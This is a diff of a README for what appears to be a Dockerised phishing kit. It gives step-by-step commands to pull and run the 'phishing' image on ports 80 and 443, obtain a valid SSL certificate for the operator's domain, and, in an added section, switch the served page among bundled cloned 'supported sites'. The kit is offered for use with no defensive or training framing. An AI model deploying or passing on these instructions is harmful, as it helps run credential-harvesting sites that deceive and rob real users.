@@ -28,7 +28,7 @@ Refer My Blog for usage : https://harshsinghvi.github.io/blog/is-cloud-a-tool-fo
 ## Usage
 * Install docker image made my me (https://hub.docker.com/r/insomniaccoder/phishing)
 ```bash 
-sudo docker pull insomniaccoder/phishing
+sudo docker pull insomniaccoder/phishing:latest # or put any other supported tags
 sudo docker run -d -it --name phishing_demo -p 80:80 -p 443:443 insomniaccoder/phishing # I have made this image myself for you guys
 ```
 Getting SSL Certificate
@@ -37,6 +37,11 @@ sudo docker exec -it phishing_demo bash # connect to the container
 ls # to see the installed sites in the container
 certbot --apache --register-unsafely-without-email -d <your domain name> # complete the precess and you got the SSL certificate
 ```
+To Change Default website
+```bash 
+docker exec  phishing_demo ./change.sh <site-name> ## use default to restore else name of above mentioned supported sites
+```
+
 ## Build your own 
 ```bash
 git clone https://github.com/harshsinghvi/phishing_cloud.git
